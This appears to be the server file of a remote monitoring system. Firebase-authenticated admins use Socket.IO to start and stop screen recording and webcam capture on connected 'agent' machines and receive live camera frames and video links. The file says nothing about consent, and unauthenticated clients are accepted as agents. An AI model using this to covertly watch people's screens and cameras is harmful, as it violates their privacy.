const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const firebaseAdmin = require('firebase-admin');

const PORT = Number(process.env.PORT) || 3000;
const CLIENT_ORIGIN = process.env.CLIENT_ORIGIN || '*';
const ADMIN_ROOM = 'admins';
const AGENT_ROOM = 'agents';

const firebasePublicConfig = {
    apiKey: process.env.FIREBASE_API_KEY,
    authDomain: process.env.FIREBASE_AUTH_DOMAIN || (process.env.FIREBASE_PROJECT_ID ? `${process.env.FIREBASE_PROJECT_ID}.firebaseapp.com` : undefined),
    projectId: process.env.FIREBASE_PROJECT_ID,
    appId: process.env.FIREBASE_APP_ID
};

const hasPublicFirebaseConfig = Boolean(
    firebasePublicConfig.apiKey
    && firebasePublicConfig.authDomain
    && firebasePublicConfig.projectId
);

const firebasePrivateKey = process.env.FIREBASE_PRIVATE_KEY?.replace(/\\n/g, '\n');
const hasServiceAccountConfig = Boolean(
    process.env.FIREBASE_PROJECT_ID
    && process.env.FIREBASE_CLIENT_EMAIL
    && firebasePrivateKey
);

let firebaseAdminReady = false;

if (hasServiceAccountConfig) {
    if (!firebaseAdmin.apps.length) {
        firebaseAdmin.initializeApp({
            credential: firebaseAdmin.credential.cert({
                projectId: process.env.FIREBASE_PROJECT_ID,
                clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
                privateKey: firebasePrivateKey
            })
        });
    }
    firebaseAdminReady = true;
} else {
    console.warn('[auth] Firebase Admin is not fully configured. Dashboard login will fail until service account env vars are set.');
}

const allowedOrigins = CLIENT_ORIGIN === '*'
    ? '*'
    : CLIENT_ORIGIN.split(',').map((origin) => origin.trim()).filter(Boolean);

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: allowedOrigins,
        methods: ['GET', 'POST']
    }
});

const parseBearerToken = (headerValue = '') => {
    if (typeof headerValue !== 'string') {
        return '';
    }

    const [scheme, token] = headerValue.trim().split(' ');
    if (!scheme || !token || !/^Bearer$/i.test(scheme)) {
        return '';
    }

    return token.trim();
};

io.use(async (socket, next) => {
    const tokenFromAuth = socket.handshake.auth?.token;
    const tokenFromHeader = parseBearerToken(socket.handshake.headers?.authorization);
    const idToken = tokenFromAuth || tokenFromHeader;

    if (!idToken) {
        socket.data.role = 'agent';
        return next();
    }

    if (!firebaseAdminReady) {
        return next(new Error('Firebase authentication is not configured on this server.'));
    }

    try {
        const decodedToken = await firebaseAdmin.auth().verifyIdToken(idToken, true);
        socket.data.role = 'admin';
        socket.data.user = {
            uid: decodedToken.uid,
            email: decodedToken.email || ''
        };
        return next();
    } catch (error) {
        return next(new Error('Unauthorized'));
    }
});

let agents = {};

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/health', (req, res) => {
    res.status(200).json({ ok: true });
});

app.get('/firebase-config', (req, res) => {
    if (!hasPublicFirebaseConfig) {
        res.status(500).json({ error: 'Firebase public config is missing on server.' });
        return;
    }

    res.status(200).json(firebasePublicConfig);
});

io.on('connection', (socket) => {
    const isAdmin = socket.data.role === 'admin';

    if (isAdmin) {
        socket.join(ADMIN_ROOM);
        console.log(`[admin] connected: ${socket.id} (${socket.data.user?.email || 'unknown'})`);
        socket.emit('update_agent_list', Object.values(agents));
    } else {
        socket.join(AGENT_ROOM);
        console.log(`[agent-socket] connected: ${socket.id}`);
    }

    const emitAgentList = () => {
        io.to(ADMIN_ROOM).emit('update_agent_list', Object.values(agents));
    };

    const emitControl = (eventName, payload = {}) => {
        const targetId = payload?.targetId;

        if (targetId) {
            io.to(targetId).emit(eventName, { targetId });
            return;
        }

        io.to(AGENT_ROOM).emit(eventName, {});
    };

    socket.on('register_node', (data = {}) => {
        if (isAdmin) {
            return;
        }

        const machineName = data.machine || 'Unknown-PC';

        agents[socket.id] = {
            machine: machineName,
            id: socket.id,
            recording: false,
            cameraOn: false
        };
        console.log(`[agent] registered: ${machineName} (${socket.id})`);
        emitAgentList();
    });

    socket.on('agent_state_update', (data = {}) => {
        if (isAdmin) {
            return;
        }

        const previous = agents[socket.id] || { id: socket.id, machine: data.machine || 'Unknown-PC' };

        agents[socket.id] = {
            ...previous,
            machine: data.machine || previous.machine,
            recording: Boolean(data.recording),
            cameraOn: Boolean(data.cameraOn),
            lastStateAt: Date.now()
        };

        emitAgentList();
        io.to(ADMIN_ROOM).emit('ui_agent_state', {
            agentId: socket.id,
            machine: agents[socket.id].machine,
            recording: agents[socket.id].recording,
            cameraOn: agents[socket.id].cameraOn,
            source: data.source || 'agent'
        });
    });

    // Recording Controls
    socket.on('admin_start_capture', (payload) => {
        if (!isAdmin) {
            return;
        }
        emitControl('start_capture', payload);
    });
    socket.on('admin_stop_capture', (payload) => {
        if (!isAdmin) {
            return;
        }
        emitControl('stop_capture', payload);
    });

    socket.on('admin_start_all', () => {
        if (!isAdmin) {
            return;
        }
        emitControl('start_capture');
    });
    socket.on('admin_stop_all', () => {
        if (!isAdmin) {
            return;
        }
        emitControl('stop_capture');
    });

    // Camera Controls
    socket.on('admin_start_camera', (payload) => {
        if (!isAdmin) {
            return;
        }
        emitControl('start_camera', payload);
    });
    socket.on('admin_stop_camera', (payload) => {
        if (!isAdmin) {
            return;
        }
        emitControl('stop_camera', payload);
    });

    // Relay Camera Frames from Agent to Dashboard
    socket.on('camera_frame', (data) => {
        if (isAdmin) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).emit('ui_camera_display', {
            ...data,
            agentId: socket.id,
            machine: agent.machine
        });
    });

    socket.on('video_upload_complete', (data) => {
        if (isAdmin) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).emit('new_video_link', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('disconnect', () => {
        if (isAdmin) {
            console.log(`[admin] disconnected: ${socket.id}`);
            return;
        }

        console.log(`[agent-socket] disconnected: ${socket.id}`);
        delete agents[socket.id];
        emitAgentList();
        io.to(ADMIN_ROOM).emit('ui_agent_state', {
            agentId: socket.id,
            online: false,
            recording: false,
            cameraOn: false,
            source: 'disconnect'
        });
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on 0.0.0.0:${PORT}`);
    console.log(`Allowed CLIENT_ORIGIN: ${CLIENT_ORIGIN}`);
});
